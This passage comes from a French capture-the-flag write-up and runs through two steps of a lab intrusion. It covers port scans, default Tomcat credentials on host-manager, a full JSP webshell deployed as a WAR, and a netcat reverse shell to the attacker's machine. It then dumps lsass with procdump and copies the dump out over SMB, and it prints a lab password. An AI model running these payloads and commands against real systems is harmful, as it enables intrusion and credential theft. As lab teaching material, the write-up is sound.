</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate <span class=m>1000</span> 172.16.42.5 <span class=p>|</span> tee out_mass_5
</span></span><span class=line><span class=cl>Discovered open port 49669/tcp on 172.16.42.5                                  
</span></span><span class=line><span class=cl>Discovered open port 445/tcp on 172.16.42.5                                    
</span></span><span class=line><span class=cl>Discovered open port 53/udp on 172.16.42.5                                     
</span></span><span class=line><span class=cl>Discovered open port 53/tcp on 172.16.42.5                                     
</span></span><span class=line><span class=cl>Discovered open port 3268/tcp on 172.16.42.5                                   
</span></span><span class=line><span class=cl>Discovered open port 50206/tcp on 172.16.42.5                                  
</span></span><span class=line><span class=cl>Discovered open port 593/tcp on 172.16.42.5                                    
</span></span><span class=line><span class=cl>Discovered open port 636/tcp on 172.16.42.5                                    
</span></span><span class=line><span class=cl>Discovered open port 49687/tcp on 172.16.42.5       
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ cat out_mass_5 <span class=p>|</span> cut -d <span class=s1>&#39; &#39;</span> -f4 <span class=p>|</span> sed <span class=s1>&#39;s/\/.*$//&#39;</span> <span class=p>|</span> tr <span class=s1>&#39;\n&#39;</span> <span class=s1>&#39;,&#39;</span>
</span></span><span class=line><span class=cl>49669,445,53,53,3268,50206,593,636,49687
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity<span class=o>=</span><span class=m>8</span> -sC -p49669,445,53,53,3268,50206,593,636,49687 172.16.42.5
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       REASON  VERSION
</span></span><span class=line><span class=cl>53/tcp    open  domain        syn-ack Microsoft DNS
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds? syn-ack
</span></span><span class=line><span class=cl>593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>636/tcp   open  tcpwrapped    syn-ack
</span></span><span class=line><span class=cl>3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: factory.lan0., Site: Default-First-Site-Name<span class=o>)</span>
</span></span><span class=line><span class=cl>49669/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
</span></span><span class=line><span class=cl>49687/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>50206/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>TCP Sequence Prediction: <span class=nv>Difficulty</span><span class=o>=</span><span class=m>253</span> <span class=o>(</span>Good luck!<span class=o>)</span>
</span></span><span class=line><span class=cl>IP ID Sequence Generation: Incremental
</span></span><span class=line><span class=cl>Service Info: Host: DC01-WW2<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 40427/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>2</span> <span class=o>(</span>port 46791/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 49455/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 14211/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2019-07-11 13:39:58
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 1601-01-01 00:09:21
</span></span></code></pre></td></tr></table></div></div><p>Cette machine ressemble à un Domain Controller, et ce pour plusieurs raisons :</p><ul><li>Le port 53 (DNS) est caractéstique d&rsquo;un AD</li><li>Le port 3268 (LDAP) mentionne le domaine <strong>factory.lan</strong></li><li>Le nom d&rsquo;hôte est plutôt explicite : <strong>DC01-WW2</strong></li></ul><h4 id=v1b-172164211>V.1.b. 172.16.42.11</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate <span class=m>1000</span> 172.16.42.11
</span></span><span class=line><span class=cl>Discovered open port 8080/tcp on 172.16.42.11          
</span></span><span class=line><span class=cl>Discovered open port 445/tcp on 172.16.42.11     
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity<span class=o>=</span><span class=m>8</span> -sC -p8080,445 172.16.42.11
</span></span><span class=line><span class=cl>PORT     STATE SERVICE       REASON  VERSION
</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds? syn-ack
</span></span><span class=line><span class=cl>8080/tcp open  http-proxy    syn-ack
</span></span><span class=line><span class=cl><span class=p>|</span> fingerprint-strings: 
</span></span><span class=line><span class=cl><span class=p>|</span>   FourOhFourRequest: 
</span></span><span class=line><span class=cl><span class=o>[</span>...<span class=o>]</span>
</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Supported Methods: GET HEAD POST PUT DELETE OPTIONS
</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: PUT DELETE
</span></span><span class=line><span class=cl><span class=p>|</span>_http-open-proxy: Proxy might be redirecting requests
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Willy Wonka Wiki
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host script results:
</span></span><span class=line><span class=cl><span class=p>|</span> p2p-conficker: 
</span></span><span class=line><span class=cl><span class=p>|</span>   Checking <span class=k>for</span> Conficker.C or higher...
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>1</span> <span class=o>(</span>port 30938/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>2</span> <span class=o>(</span>port 43825/tcp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>3</span> <span class=o>(</span>port 45891/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   Check <span class=m>4</span> <span class=o>(</span>port 33171/udp<span class=o>)</span>: CLEAN <span class=o>(</span>Timeout<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  0/4 checks are positive: Host is CLEAN or ports are blocked
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-security-mode: 
</span></span><span class=line><span class=cl><span class=p>|</span>   2.02: 
</span></span><span class=line><span class=cl><span class=p>|</span>_    Message signing enabled and required
</span></span><span class=line><span class=cl><span class=p>|</span> smb2-time: 
</span></span><span class=line><span class=cl><span class=p>|</span>   date: 2019-07-11 13:43:52
</span></span><span class=line><span class=cl><span class=p>|</span>_  start_date: 1601-01-01 00:09:21
</span></span></code></pre></td></tr></table></div></div><p>Intuitivement, cette machine ressemble au point d&rsquo;entrée que nous cherchons. Les deux premières hypothèses à exploiter sont donc :</p><ol><li>Connexions anonymes sur le partage Samba ;</li><li>Vulnérabilités et / ou identifiants par défaut sur le serveur 8080, tomcat étant une solution répandue sur ce port.</li></ol><h4 id=v1c-1721642101>V.1.c. 172.16.42.101</h4><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo masscan -e tun0 -p0-65535,U:0-65535 --rate <span class=m>1000</span> 172.16.42.101
</span></span><span class=line><span class=cl>Discovered open port 135/tcp on 172.16.42.101                                  
</span></span><span class=line><span class=cl>Discovered open port 49712/tcp on 172.16.42.101                                
</span></span><span class=line><span class=cl>Discovered open port 445/tcp on 172.16.42.101                                  
</span></span><span class=line><span class=cl>Discovered open port 5040/tcp on 172.16.42.101                                 
</span></span><span class=line><span class=cl>Discovered open port 49669/tcp on 172.16.42.101                  
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo nmap -sT -sV -O -T4 -vvv --version-intensity<span class=o>=</span><span class=m>8</span> -sC -p135,49712,445,5040,49669 172.16.42.101
</span></span><span class=line><span class=cl>PORT      STATE SERVICE       REASON  VERSION
</span></span><span class=line><span class=cl>135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>445/tcp   open  microsoft-ds? syn-ack
</span></span><span class=line><span class=cl>5040/tcp  open  unknown       syn-ack
</span></span><span class=line><span class=cl>49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span><span class=line><span class=cl>49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
</span></span></code></pre></td></tr></table></div></div><p>Les trois premiers ports sont suspects et peuvent laisser penser à :</p><ol><li>Une connexion anonyme sur le RPC et SMB ;</li><li>Un service &ldquo;unknown&rdquo; sur le port 5040.</li></ol><h3 id=v2-enumération-du-serveur-web>V.2. Enumération du serveur web</h3><p>Après quelques tentatives infructueuses sur les différents serveurs SMB, il est temps de se concentrer sur le serveur web : <code>http://172.16.42.11:8080/</code>.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step5_index.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step5_index.png, /lib/images/writeups/2019_wonkachallenge/step5_index.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step5_index.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step5_index.png title=/lib/images/writeups/2019_wonkachallenge/step5_index.png></p><p>En naviguant sur le site, il est possible de trouver une cartographie du réseau : <code>http://172.16.42.11:8080/infra.jsp</code></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/infra.png data-srcset="/lib/images/writeups/2019_wonkachallenge/infra.png, /lib/images/writeups/2019_wonkachallenge/infra.png 1.5x, /lib/images/writeups/2019_wonkachallenge/infra.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/infra.png title=/lib/images/writeups/2019_wonkachallenge/infra.png></p><p>L&rsquo;extension <strong>jsp</strong> nous conforte dans l&rsquo;idée que nous sommes en présence d&rsquo;un serveur tomcat, la page 404 la confirme. L&rsquo;exécution de dirsearch avec une wordlist adaptée retourne des pages intéressantes :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u http://172.16.42.11:8080/ -e jsp,html,do,action,txt -w ./tomcat.txt    
</span></span><span class=line><span class=cl><span class=o>[</span>15:08:17<span class=o>]</span> <span class=m>302</span> -    0B  - /host-manager  -&gt;  /host-manager/
</span></span><span class=line><span class=cl><span class=o>[</span>15:08:17<span class=o>]</span> <span class=m>401</span> -    2KB - /host-manager/html/%2A
</span></span><span class=line><span class=cl><span class=o>[</span>15:08:17<span class=o>]</span> <span class=m>302</span> -    0B  - /manager  -&gt;  /manager/
</span></span></code></pre></td></tr></table></div></div><p>D&rsquo;ordinaire, la page <code>manager</code> est la solution de facilité : avec des identifiants par défaut, il suffit de générer un webshell avec l&rsquo;extension <strong>war</strong> et de l&rsquo;uploader. Dans notre cas, cette page est &mldr; Indisponible :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step5_manager.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step5_manager.png, /lib/images/writeups/2019_wonkachallenge/step5_manager.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step5_manager.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step5_manager.png title=/lib/images/writeups/2019_wonkachallenge/step5_manager.png></p><p>Dans les résultats du dirsearch, il y a aussi la page <code>/host-manager</code>. Cette page est protégée par une <strong>Basic authentification</strong>, heureusement les identifiants par défaut de Tomcat fonctionnent :</p><blockquote><p>tomcat : tomcat</p></blockquote><p><strong>Certilience</strong> a écrit un très bon guide concernant cette attaque : <a href=https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/ target=_blank rel="noopener noreffer">https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/</a></p><h3 id=v3-mise-en-place-de-lexploitation>V.3. Mise en place de l&rsquo;exploitation</h3><p>N&rsquo;étant pas un grand fan de Metasploit, j&rsquo;essaie de l&rsquo;utiliser le moins possible, et ce surtout lorsque d&rsquo;autres solutions existent. Une d&rsquo;elle consiste à récupérer un webshell &ldquo;standard&rdquo;, plutôt que de générer une charge avec un meterpreter. En effet, une archive <strong>war</strong> consiste tout simplement en une archive zip avec une hiérarchie particulière :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ tree .                   
</span></span><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── index.jsp
</span></span><span class=line><span class=cl>├── META-INF
</span></span><span class=line><span class=cl>│   └── MANIFEST.MF
</span></span><span class=line><span class=cl>└── WEB-INF
</span></span><span class=line><span class=cl>    └── web.xml
</span></span></code></pre></td></tr></table></div></div><p>La charge malveillante se situe dans le fichier <strong>index.jsp</strong> :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>&lt;FORM METHOD=GET ACTION=&#39;index.jsp&#39;&gt;
</span></span><span class=line><span class=cl>&lt;INPUT name=&#39;cmd&#39; type=text&gt;
</span></span><span class=line><span class=cl>&lt;INPUT type=submit value=&#39;Run&#39;&gt;
</span></span><span class=line><span class=cl>&lt;/FORM&gt;
</span></span><span class=line><span class=cl>&lt;%@ page import=&#34;java.io.*&#34; %&gt;
</span></span><span class=line><span class=cl>&lt;%
</span></span><span class=line><span class=cl>   String cmd = request.getParameter(&#34;cmd&#34;);
</span></span><span class=line><span class=cl>   String output = &#34;&#34;;
</span></span><span class=line><span class=cl>   if(cmd != null) {
</span></span><span class=line><span class=cl>      String s = null;
</span></span><span class=line><span class=cl>      try {
</span></span><span class=line><span class=cl>         Process p = Runtime.getRuntime().exec(cmd,null,null);
</span></span><span class=line><span class=cl>         BufferedReader sI = new BufferedReader(new
</span></span><span class=line><span class=cl>InputStreamReader(p.getInputStream()));
</span></span><span class=line><span class=cl>         while((s = sI.readLine()) != null) { output += s+&#34;&lt;/br&gt;&#34;; }
</span></span><span class=line><span class=cl>      }  catch(IOException e) {   e.printStackTrace();   }
</span></span><span class=line><span class=cl>   }
</span></span><span class=line><span class=cl>%&gt;
</span></span><span class=line><span class=cl>&lt;pre&gt;&lt;%=output %&gt;&lt;/pre&gt;
</span></span></code></pre></td></tr></table></div></div><p>La charge ci-dessus provient du dépôt de <strong>tennc</strong> : <a href=https://github.com/tennc/webshell target=_blank rel="noopener noreffer">https://github.com/tennc/webshell</a></p><p>L&rsquo;archive <strong>war</strong> utilisée lors de l&rsquo;exploitation peut être téléchargée ici : <a href=https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs target=_blank rel="noopener noreffer">https://mega.nz/#!73RCVKDK!EPrPZ_JeWgZc2RWQq2OyErlJUGa-zAjf3fo8LbgtiCs</a></p><h4 id=v3a-nouvel-hôte>V.3.a. Nouvel hôte</h4><p>En suivant les indications de <strong>Certilience</strong>, on ajoute une entrée dans le fichier <code>/etc/hosts</code> de notre machine afin de lier l&rsquo;IP du serveur tomcat à un hostname :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo <span class=nb>echo</span> <span class=s2>&#34;172.16.42.11	maki-lab&#34;</span> &gt;&gt; /etc/hosts
</span></span></code></pre></td></tr></table></div></div><p>Cette étape sera utile lors du déploiement de la nouvelle application via les UNC path.</p><h4 id=v3b-smb-server>V.3.b. SMB server</h4><p>Il est impératif de mettre en place un partage samba (<strong>smbserver.py</strong>) pour que le serveur Tomcat puisse récupérer notre application malveillante :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ sudo smbserver.py -smb2support data .
</span></span></code></pre></td></tr></table></div></div><p>La commande ci-dessus ouvre un partage nommé <strong>data</strong> dans le dossier courant, où se trouve l&rsquo;archive war.</p><h3 id=v4-exploitation>V.4. Exploitation</h3><p>Les préparatifs étant terminés, il est temps de déployer le webshell :</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step5_hostmanager.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step5_hostmanager.png, /lib/images/writeups/2019_wonkachallenge/step5_hostmanager.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step5_hostmanager.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step5_hostmanager.png title=/lib/images/writeups/2019_wonkachallenge/step5_hostmanager.png></p><p>De l&rsquo;activité est visible sur les logs du serveur SMB lors du déploiement de notre application. On peut finalement accéder à cette application avec l&rsquo;URL suivante : <code>http://maki-lab:8080/cmd/index.jsp</code></p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step5_webshell.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step5_webshell.png, /lib/images/writeups/2019_wonkachallenge/step5_webshell.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step5_webshell.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step5_webshell.png title=/lib/images/writeups/2019_wonkachallenge/step5_webshell.png></p><h3 id=v5-reverse-shell>V.5. Reverse shell</h3><p>Pour récupérer un shell plus ou moins interactif, il est possible de déposer le binaire <strong>netcat</strong> dans le partage <strong>data</strong>, créé pour l&rsquo;exploitation précédente. Sous Windows, il est possible d&rsquo;exécuter des binaires distants grâce aux UNC path.</p><h4 id=v5a-terminal-1---hôte>V.5.a. Terminal 1 - Hôte</h4><p>Le binaire <code>rlwrap</code> (readline wrapper) sert d&rsquo;historique de commandes, mais aussi d&rsquo;interface entre le clavier local et distant. L&rsquo;utiliser lors d&rsquo;un reverse shell permet à l&rsquo;attaquant de pouvoir utiliser les flèches de son clavier correctement et d&rsquo;avoir l&rsquo;historique des commandes de la session :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>KaliVM<span class=o>)</span> ➜ rlwrap ncat -klvp <span class=m>12345</span>
</span></span></code></pre></td></tr></table></div></div><h4 id=v5b-application-malveillante---serveur-tomcat>V.5.b. Application malveillante - Serveur tomcat</h4><p>L&rsquo;UNC path ci-dessous va exécuter le binaire en mémoire sur le serveur tomcat et établir ainsi une connexion sur le port 12345 :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV01-INTRANET<span class=o>)</span> ➜ <span class=se>\\</span>10.8.0.10<span class=se>\d</span>ata<span class=se>\n</span>c64.exe -e cmd.exe 10.8.0.10 <span class=m>12345</span>
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step5_reverseshell.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step5_reverseshell.png, /lib/images/writeups/2019_wonkachallenge/step5_reverseshell.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step5_reverseshell.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step5_reverseshell.png title=/lib/images/writeups/2019_wonkachallenge/step5_reverseshell.png></p><p>Cette méthode permet de récupérer un accès shell plus ou moins interactif et plus ou moins stable.</p><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step5_flag.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step5_flag.png, /lib/images/writeups/2019_wonkachallenge/step5_flag.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step5_flag.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step5_flag.png title=/lib/images/writeups/2019_wonkachallenge/step5_flag.png></p><h3 id=v5-flag>V.5. Flag</h3><blockquote><p>8F30C4422EB4E5D9A2BF7EE44D5098D68314C35BE58E9919417B45FCBEF205C8</p></blockquote><hr><h3 id=resources-3>Resources</h3><ol><li><strong>SecList</strong>, <em>Discovery Web-content Tomcat</em>, GitHub : <a href=https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt target=_blank rel="noopener noreffer">https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/tomcat.txt</a></li><li><strong>Pôle audit de Certilience</strong>, <em>Variante d’exploitation d’un Apache Tomcat : host manager app vulnérable ?</em>, Blog de Certilience : <a href=https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/ target=_blank rel="noopener noreffer">https://www.certilience.fr/2019/03/variante-d-exploitation-dun-tomcat-host-manager/</a></li><li><strong>Eternallybored</strong>, <em>Download netcat Windows binaries</em>; eternallybored.org : <a href=https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip target=_blank rel="noopener noreffer">https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip</a></li></ol><hr><hr><h2 id=vi-step-6---mimikatz-you-said->VI. Step 6 - Mimikatz you said ?</h2><blockquote><p>SHA256(adminServer&rsquo;s passwd)</p></blockquote><h3 id=tldr-5>TL;DR</h3><ol><li>Exécuter <code>procdump.exe</code> sur le serveur tomcat (SRV01-INTRANET) ;</li><li>Récupérer le minidump du processus <code>lsass.exe</code> ;</li><li>Retrouver les identifiants stockés grâce à <code>mimikatz</code> en local : <code>adminserver</code> : <code>factory.lan\adminServer : #3LLe!!estOuL@Poulette</code>.</li></ol><hr><h3 id=vi1-post-exploitation>VI.1. Post exploitation</h3><p>Lorsqu&rsquo;un accès privilégié est obtenu sur un serveur, il est naturel d&rsquo;essayer de récupérer des identifiants (mimikatz pour Windows ou swapdigger pour Linux). En l&rsquo;occurrence, <strong>Mimikatz</strong> va chercher les identifiants dans la mémoire du processus de <em>lsass.exe</em>.</p><p>Une autre méthode, plus difficile à détecter pour de potentiels anti-virus, consiste à récupérer la mémoire de ce processus grâce à <strong>procdump.exe</strong>. Ce binaire est développé et signé par Microsoft et fait partie des <em>Windows Sysinternals</em>. Mimikatz est capable de charger un dump mémoire de ce processus en local et d&rsquo;en extraire les identifiants.</p><h3 id=vi2-getting-lsass-minidump>VI.2. Getting lsass minidump</h3><p>L&rsquo;exécution de <strong>procdump.exe</strong> se fait comme pour <em>netcat</em> : via les UNC path.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV01-INTRANET<span class=o>)</span> ➜ <span class=se>\\</span>10.8.0.10<span class=se>\d</span>ata<span class=se>\p</span>rocdump64.exe -ma lsass.exe lsadump
</span></span></code></pre></td></tr></table></div></div><p><img class=lazyload src=/maki.bzh/svg/loading.min.svg data-src=/lib/images/writeups/2019_wonkachallenge/step6_procdump.png data-srcset="/lib/images/writeups/2019_wonkachallenge/step6_procdump.png, /lib/images/writeups/2019_wonkachallenge/step6_procdump.png 1.5x, /lib/images/writeups/2019_wonkachallenge/step6_procdump.png 2x" data-sizes=auto alt=/lib/images/writeups/2019_wonkachallenge/step6_procdump.png title=/lib/images/writeups/2019_wonkachallenge/step6_procdump.png></p><p>Toujours avec les UNC path, on copie les fichiers sur un partage distant :</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>(</span>SRV01-INTRANET<span class=o>)</span> ➜ copy lsadump.dmp <span class=se>\\</span>10.8.0.10<span class=se>\d</span>ata<span class=se>\l</span>sadump.dmp
